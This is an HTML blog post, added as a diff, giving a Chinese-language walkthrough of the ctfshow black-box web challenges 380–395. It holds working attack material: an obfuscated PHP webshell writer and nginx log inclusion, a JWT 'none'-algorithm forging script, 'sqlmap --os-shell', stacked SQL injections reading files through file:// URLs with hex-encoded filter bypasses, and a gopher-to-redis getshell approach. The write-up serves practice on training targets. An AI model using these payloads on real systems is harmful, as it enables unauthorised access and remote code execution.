@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web380 黑盒测试 字典里扩充了一下hhh，一开始扫不出来  存在page.php，访问查看  可以看到有一个未定义的变量id，尝试直接读flag  web381  在源码中link标签处css引用存在另一后台的url  直接访问  web382 这次我们继续访问可疑地址，变成了一个登录框 万能密码就登录进去了   web383 同理  web384 密码前2位是小写字母，后三位是数字 这关">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFSHOW-黑盒测试">
+<meta property="og:url" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:site_name" content="RacerZ">
+<meta property="og:description" content="web380 黑盒测试 字典里扩充了一下hhh，一开始扫不出来  存在page.php，访问查看  可以看到有一个未定义的变量id，尝试直接读flag  web381  在源码中link标签处css引用存在另一后台的url  直接访问  web382 这次我们继续访问可疑地址，变成了一个登录框 万能密码就登录进去了   web383 同理  web384 密码前2位是小写字母，后三位是数字 这关">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221115091421698.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221115091501180.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221115091852016.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221115092558368.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221115094413246.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221115095149146.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221115095331984.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116104542472.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116105922442.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116110102648.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116110528137.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116111140139.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116111348215.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116113756181.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116114007622.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116114927821.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116115743377.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116203650041.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116221204844.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116223211323.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116223401984.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116223600353.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116223630665.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116224655638.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116225139034.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116225348427.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117220504436.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117222208780.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117223645751.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117223941184.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117225310123.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117230226894.png">
+<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117230321734.png">
+<meta property="article:published_time" content="2022-11-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-11-17T15:19:56.065Z">
+<meta property="article:author" content="RacerZ">
+<meta property="article:tag" content="ctfshow">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221115091421698.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CTFSHOW-黑盒测试</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/11/14/ctfshow-XXE/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/&text=CTFSHOW-黑盒测试"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/&title=CTFSHOW-黑盒测试"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/&is_video=false&description=CTFSHOW-黑盒测试"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTFSHOW-黑盒测试&body=Check out this article: https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/&title=CTFSHOW-黑盒测试"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/&title=CTFSHOW-黑盒测试"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/&title=CTFSHOW-黑盒测试"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/&title=CTFSHOW-黑盒测试"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/&name=CTFSHOW-黑盒测试&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/&t=CTFSHOW-黑盒测试"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        CTFSHOW-黑盒测试
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">RacerZ</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-16T16:00:00.000Z" itemprop="datePublished">2022-11-17</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/ctfshow/" rel="tag">ctfshow</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <ol>
+<li><p>web380 黑盒测试</p>
+<p>字典里扩充了一下hhh，一开始扫不出来</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221115091421698.png" alt="image-20221115091421698"></p>
+<p>存在page.php，访问查看</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221115091501180.png" alt="image-20221115091501180"></p>
+<p>可以看到有一个未定义的变量id，尝试直接读flag</p>
+</li>
+<li><p>web381 </p>
+<p>在源码中link标签处css引用存在另一后台的url</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221115091852016.png" alt="image-20221115091852016"></p>
+<p>直接访问</p>
+</li>
+<li><p>web382</p>
+<p>这次我们继续访问可疑地址，变成了一个登录框</p>
+<p>万能密码就登录进去了</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221115092558368.png" alt="image-20221115092558368"></p>
+</li>
+<li><p>web383</p>
+<p>同理</p>
+</li>
+<li><p>web384 密码前2位是小写字母，后三位是数字</p>
+<p>这关没有sql注入漏洞了，但提示应该是存在弱口令，直接按规则爆破</p>
+<p>有点难，最后密码是xy123</p>
+</li>
+<li><p>web385</p>
+<p>这关其实也算是目录扫描吧，扫出install安装目录，其可以重置默认密码</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221115094413246.png" alt="image-20221115094413246"></p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221115095149146.png" alt="image-20221115095149146"></p>
+</li>
+<li><p>web386 </p>
+<p>再次访问install，会发现存在lock.dat</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221115095331984.png" alt="image-20221115095331984"></p>
+<p>FUZZ一下php文件名，多了一个clear.php</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116104542472.png" alt="image-20221116104542472"></p>
+</li>
+</ol>
+<p>访问<code>clear.php/?file=./install/lock.dat</code>即可清理掉lock.dat</p>
+<p>之后再去访问<code>/install?install</code>即可重置密码，然后重新弱密码登录即可</p>
+<ol start="8">
+<li><p>web386. 前面部分和386一样</p>
+<p>这题已经没法去删掉lock.dat文件了，再扫扫目录</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116105922442.png" alt="image-20221116105922442"></p>
+</li>
+</ol>
+<p>先看看robots.txt，可以去访问debug目录，拼接参数试试</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116110102648.png" alt="image-20221116110102648"></p>
+<p>发现可以读出/etc/passwd，因此可以判断，这个目录下文件提供一个文件包含的操作。由于该站点的中间件为nginx，所以尝试日志包含。<code>/var/log/nginx/access.log</code>，确实可以，那么尝试写马</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116110528137.png" alt="image-20221116110528137"></p>
+<p>直接写马失败，按照上题思路，我们可以手动删除lock.dat文件，尝试写入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;/var/www/html/install/lock.dat&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116111140139.png" alt="image-20221116111140139"></p>
+<p>之后按照上题来就行</p>
+<ol start="9">
+<li><p>web387</p>
+<p>按照上一题的思路来，会发现已经无回显</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116111348215.png" alt="image-20221116111348215"></p>
+</li>
+</ol>
+<p>这次我们基于<code>/alsckdfy</code>目录去扫一下存在什么文件</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116113756181.png" alt="image-20221116113756181"></p>
+<p>有个编辑器看看能否利用，访问可知是一个KindEditor编辑器，找找版本 <code>4.1.11</code></p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116114007622.png" alt="image-20221116114007622"></p>
+<p>找下有无可利用的漏洞，<a target="_blank" rel="noopener" href="https://www.hacking8.com/bug-editor/Kindeditor/CVE-2017-1002024-Kindeditor-_=4.1.11-%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html">https://www.hacking8.com/bug-editor/Kindeditor/CVE-2017-1002024-Kindeditor-_=4.1.11-%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html</a></p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116114927821.png" alt="image-20221116114927821"></p>
+<p>也就是说，我们这里可以上传txt,html一类文件，且上传后的文件路径可知<code>/alsckdfy/attached/file/</code> . 这里的话我们可以配合之前的日志包含，将一段php恶意代码通过日志文件来执行</p>
+<p>首先，上传恶意代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="variable">$a</span> = <span class="string">&#x27;&lt;?ph&#x27;</span>.<span class="string">&#x27;p ev&#x27;</span>.<span class="string">&#x27;al($_PO&#x27;</span>.<span class="string">&#x27;ST[1]);?&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/1.php&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问该文件验证上传成功</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116115743377.png" alt="image-20221116115743377"></p>
+<p>接下来访问<code>/debug?file=xxx</code>，来将恶意代码写入日志文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/debug/?file=/var/www/html/alsckdfy/attached/file/20221116/20221116035705_82067.txt</span><br></pre></td></tr></table></figure>
+
+<p>然后包含日志文件进来，使得恶意代码被解析执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/debug/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116203650041.png" alt="image-20221116203650041"></p>
+<ol start="10">
+<li><p>web389</p>
+<p>直接访问<code>/debug</code>，会回显权限不足</p>
+<p>看看cookie，存在auth键值对</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY2ODYwNzU4NywiZXhwIjoxNjY4NjE0Nzg3LCJuYmYiOjE2Njg2MDc1ODcsInN1YiI6InVzZXIiLCJqdGkiOiI3MTI0N2E3ZDMxOWE1MmMzZjM3YmE3OTA5MGM1N2FkZCJ9.jxCUL0trBNZNdp_fXROsID50HaOnAs37mEbBWuUhnJk</span><br></pre></td></tr></table></figure>
+
+<p>很明显是一个jwt鉴权，我们解码一下看看字段</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116221204844.png" alt="image-20221116221204844"></p>
+<p>尝试直接进行空加密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1668607587</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">1668614787</span>,</span><br><span class="line">    <span class="string">&quot;nbf&quot;</span>: <span class="number">1668607587</span>,</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jti&quot;</span>: <span class="string">&quot;71247a7d319a52c3f37ba79090c57add&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;none&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(payload, key=<span class="string">&quot;&quot;</span>, algorithm=<span class="string">&quot;none&quot;</span>, headers=header)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>
+
+<p>接下来按照上一题流程即可</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116223211323.png" alt="image-20221116223211323"></p>
+</li>
+</ol>
+<ol start="11">
+<li><p>web390</p>
+<p>关注url出现了参数</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116223401984.png" alt="image-20221116223401984"></p>
+<p>关注回显长度的变化，正常参数时</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116223600353.png" alt="image-20221116223600353"></p>
+<p>当加入特殊字符时</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116223630665.png" alt="image-20221116223630665"></p>
+<p>由此可知存在盲注，直接sqlmap一把梭</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u xxx --os-shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116224655638.png" alt="image-20221116224655638"></p>
+</li>
+<li><p>web391-392</p>
+<p>测一下<code>/search.php?id=</code>会发现也存在sql注入</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116225139034.png" alt="image-20221116225139034"></p>
+</li>
+</ol>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116225348427.png" alt="image-20221116225348427"></p>
+<ol start="13">
+<li><p>web393</p>
+<p>title处的参数仍然存在时间回显不一致的问题（比较隐蔽），可以利用盲注。同时关注到底下多了一个搜索引擎</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117220504436.png" alt="image-20221117220504436"></p>
+<p>关注一下url</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117222208780.png" alt="image-20221117222208780"></p>
+</li>
+</ol>
+<p>这里讲述另外一种利用方式，先基本查一下库中数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://836b34a4-5a85-46c1-ae8a-c68874d0c7e8.challenge.ctf.show/search.php?title=1&quot; --dbs</span><br><span class="line"># ctfshow</span><br><span class="line"> sqlmap -u &quot;http://836b34a4-5a85-46c1-ae8a-c68874d0c7e8.challenge.ctf.show/search.php?title=1&quot; -D ctfshow --tables</span><br><span class="line"># admin_user content link</span><br><span class="line">sqlmap -u &quot;http://836b34a4-5a85-46c1-ae8a-c68874d0c7e8.challenge.ctf.show/search.php?title=1&quot; -D ctfshow -T link --columns</span><br><span class="line"># id name url(varchar)</span><br></pre></td></tr></table></figure>
+
+<p>因此结合回显，我们可以修改id对应的url值，利用file协议将本地文件回显出来</p>
+<p>**payload: **</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; update link set url=&#x27;file:///flag&#x27; where id=4; %23</span><br></pre></td></tr></table></figure>
+
+<ol start="14">
+<li><p>web394 FLAG_NOT_HERE</p>
+<p>title字段仍然存在时间回显问题，所以可以继续时间盲注。我们依然可以用上一题的思路通过修改Url的值来回显flag，需要注意的是，这次参数存在关键词过滤，因此需要通过编码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; update link set url=0x66696c653a2f2f2f666c6167; %23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117223645751.png" alt="image-20221117223645751"></p>
+<p>发现flag不在根目录了，那就还在<code>/var/www/html/alsckdfy/check.php</code>中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; update link set url=0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870; %23</span><br></pre></td></tr></table></figure>
+
+<p>原来在源代码里，差点被骗了。。。</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117223941184.png" alt="image-20221117223941184"></p>
+</li>
+<li><p>web395 FLAG_NOT_HERE</p>
+<p>这里学习一种新的思路，注入位置未变，我们可以利用未授权的redis进行getshell</p>
+<p>也就是说，这里利用的是修改url的值为gopher协议，去打redis</p>
+<p>我们首先要解决的问题是url字段长度问题，由前面几题知道该字段结构为<code>varchar(255)</code>,</p>
+<p>因此先修改字段类型为text</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; alter table link modify column url text; %23</span><br></pre></td></tr></table></figure>
+
+<p>接着生成gopher的payload</p>
+<p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117225310123.png" alt="image-20221117225310123"></p>
+</li>
+</ol>
